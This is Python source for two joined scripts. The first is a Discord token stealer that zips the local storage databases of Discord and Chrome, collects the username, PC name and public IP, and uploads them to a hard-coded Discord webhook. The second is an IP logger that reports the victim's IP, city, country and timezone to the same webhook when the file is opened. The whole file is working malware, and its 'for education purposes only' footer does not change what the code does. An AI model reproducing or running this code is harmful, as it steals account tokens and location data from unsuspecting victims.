import os
import sys
import shutil
import zipfile
from requests import get
from dhooks import Webhook, File

hook = Webhook('https://discord.com/api/webhooks/1562597795666333778/xOCbGACPZbtBxXUXRMzwLtq5Cv7kQQR9-h92a4ZwkSnZFlrKYM7zpdzqg_I1rpKwoiJH')
path = os.getenv('APPDATA')
localpath = os.getenv('LOCALAPPDATA')
user = os.getenv('username')
pc_name = os.environ['COMPUTERNAME']
temp_dir = localpath+"\\temp\\"
tokendir = path+"\\Discord\\Local Storage\\leveldb\\"
ptbtokendir = path+"\\discordptb\\Local Storage\\leveldb\\"
canarytokendir = path+"\\discordcanary\\Local Storage\\leveldb\\"
chromedir = localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"

zipf = temp_dir+"logs.zip"
if os.path.isfile(temp_dir+"run.log"):
  sys.exit()
ip = get('https://api.ipify.org').text

if os.path.isfile(zipf):
  os.remove(zipf)

zip = zipfile.ZipFile(zipf,'a')

if os.path.isdir(tokendir):
  discordinst = True
  try:
    for root, dirs, files in os.walk(tokendir):
      for file in files:
        zip.write(tokendir+file)
  except Exception:
    failed = True
else:
  discordinst = False
  
if os.path.isdir(ptbtokendir):
  ptbinst = True
  try:
     for root, dirs, files in os.walk(ptbtokendir):
       for file in files:
         zip.write(ptbtokendir+file)
  except Exception:
     ptbfailed = True
else:
  ptbinst = False
  
if os.path.isdir(canarytokendir):
  canaryinst = True
  try:
     for root, dirs, files in os.walk(canarytokendir):
       for file in files:
         zip.write(canarytokendir+file)
  except Exception:
     canaryfailed = True
else:
  canaryinst = False
 
if os.path.isdir(chromedir):
  chromeinst = True
  try:
     for root, dirs, files in os.walk(chromedir):
       for file in files:
         zip.write(chromedir+file)
  except Exception:
     chromefailed = True
else:
  chromeinst = False
zip.close()

def main():
  with open (temp_dir+"run.log", 'w+') as handle:
    handle.write("Fatal Error.")
    handle.close()
  hook.send('```css\nToken Grabbed! \n\nUsername: '+str(user) + '\nPC Name: ' + pc_name + '\nIP Address: {}'.format(ip) +'\n\nZip File:```')
  try:
    hook.send(file = File(zipf, name=str(user)+" Logs.zip"))
  except:
    hook.send('```css\nThere was an error obtaining the zip.```')
  if discordinst and ptbinst and canaryinst and chromeinst == False:
    hook.send("```css\nUser had nothing installed```")
  try:
    os.remove(zipf)
  except:
    return ''

main()

# Import requirements
import requests
import public_ip as getip
from discord_webhook import DiscordWebhook, DiscordEmbed

# Import requirements
import requests
import public_ip as getip
from discord_webhook import DiscordWebhook, DiscordEmbed

# Get IP details
publicip = getip.get()
params = ["ip",'query', 'status', 'country', 'countryCode', 'city', 'timezone', 'mobile']

resp = requests.get('http://ip-api.com/json/' + publicip, params={'fields': ','.join(params)})
info = resp.json()

country = info['country']
city = info['city']
countrycode = info['countryCode']
timezone = info['timezone']
status = info['status']

# Set the webhook
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1562597795666333778/xOCbGACPZbtBxXUXRMzwLtq5Cv7kQQR9-h92a4ZwkSnZFlrKYM7zpdzqg_I1rpKwoiJH", # Enter your Discord Webhook address
                         username="ASISAMKO IP LOGGER") # Enter Webhook name

embed = DiscordEmbed(title="New IP Address Logged 👁️",
                    color = "e8734d",
                    url="https://github.com/asisamko",)

embed.set_author(name="",
                 url="https://github.com/asisamko",
                 icon_url="")

embed.add_embed_field(name=f"Someone opened the file!",
                value="",
                inline=False)

embed.add_embed_field(name="📡 IP Address:",
                value=f"||```{publicip}```||",
                inline=False)
embed.add_embed_field(name="🌎 Country:",
                value=f"{country} ({countrycode})",
                inline=True)
embed.add_embed_field(name="🏣 City:",
                value=f"{city}",
                inline=True)
embed.add_embed_field(name="🌐 Timezone:",
                value=f"{timezone}",
                inline=True)
embed.add_embed_field(name="",
                value=f"",
                inline=True)
embed.set_footer(text=f"For education purposes only!")
embed.set_timestamp()

webhook.add_embed(embed)
response = webhook.execute()
